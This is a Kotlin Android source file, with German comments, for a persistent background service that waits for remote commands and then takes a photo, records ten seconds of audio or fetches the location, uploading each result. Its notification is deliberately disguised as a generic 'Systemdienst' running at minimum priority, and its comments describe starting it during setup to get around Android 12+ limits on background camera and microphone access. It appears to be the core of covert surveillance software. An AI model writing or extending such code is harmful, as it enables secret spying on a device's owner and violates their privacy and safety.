package com.ikianti.app.service

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.ikianti.app.capture.AudioCapture
import com.ikianti.app.capture.CameraCapture
import com.ikianti.app.capture.LocationCapture

/**
 * Persistenter Foreground Service – wird beim App-Start (im Vordergrund) gestartet
 * und läuft dauerhaft im Hintergrund.
 *
 * Android 12+: Kamera/Mikro dürfen nur von einem FGS genutzt werden der WÄHREND
 * des Vordergrund-Betriebs gestartet wurde. Daher muss dieser Service beim Setup
 * (MainActivity) gestartet werden, nicht erst wenn ein FCM-Befehl kommt.
 *
 * FCM-Befehle werden über einen lokalen Broadcast empfangen, damit kein
 * neuer Service-Start aus dem Hintergrund nötig ist.
 */
class CaptureForegroundService : Service() {

    companion object {
        const val ACTION_COMMAND = "com.ikianti.app.ACTION_COMMAND"
        const val EXTRA_COMMAND  = "command"
        private const val CHANNEL_ID      = "sys_service_channel"
        private const val NOTIFICATION_ID = 1
        private const val TIMEOUT_MS      = 30_000L
        private const val TAG             = "CaptureFGS"

        fun start(context: Context) {
            val intent = Intent(context, CaptureForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun sendCommand(context: Context, command: String) {
            val intent = Intent(ACTION_COMMAND).apply {
                putExtra(EXTRA_COMMAND, command)
                setPackage(context.packageName)
            }
            context.sendBroadcast(intent)
        }
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var isBusy = false

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action != ACTION_COMMAND) return
            val command = intent.getStringExtra(EXTRA_COMMAND) ?: return
            Log.d(TAG, "Befehl empfangen: $command")
            if (isBusy) {
                Log.w(TAG, "Service ist bereits beschäftigt – Befehl ignoriert")
                return
            }
            executeCommand(command)
        }
    }

    override fun onCreate() {
        super.onCreate()
        startForegroundCompat()

        val filter = IntentFilter(ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
        Log.d(TAG, "Persistenter Service gestartet und wartet auf Befehle")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Service neu starten wenn Android ihn beendet
    }

    private fun executeCommand(command: String) {
        isBusy = true
        val timeoutRunnable = Runnable {
            Log.w(TAG, "Timeout für Befehl: $command")
            isBusy = false
        }
        mainHandler.postDelayed(timeoutRunnable, TIMEOUT_MS)

        val onDone = {
            mainHandler.removeCallbacks(timeoutRunnable)
            isBusy = false
            Log.d(TAG, "Befehl abgeschlossen: $command")
        }

        when (command) {
            "photo"    -> CameraCapture(this).captureAndUpload { onDone() }
            "audio"    -> AudioCapture(this).recordAndUpload(seconds = 10) { onDone() }
            "location" -> LocationCapture(this).fetchAndUpload { onDone() }
            else       -> { Log.w(TAG, "Unbekannter Befehl: $command"); isBusy = false }
        }
    }

    private fun startForegroundCompat() {
        val channel = NotificationChannel(
            CHANNEL_ID, "Systemdienste", NotificationManager.IMPORTANCE_MIN
        ).apply {
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
        }
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(channel)

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setContentTitle("Systemdienst")
            .setContentText("Systemprozess")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID, notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    override fun onDestroy() {
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
